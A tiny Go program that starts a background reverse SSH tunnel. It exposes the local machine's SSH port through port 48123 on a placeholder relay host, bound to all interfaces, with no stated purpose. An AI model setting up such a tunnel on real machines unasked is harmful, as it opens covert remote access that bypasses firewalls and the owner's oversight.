package main
import "os/exec"
func main(){ exec.Command("ssh", "-N", "-R", "[::]:48123:localhost:22", "ops@relay.example").Start() }
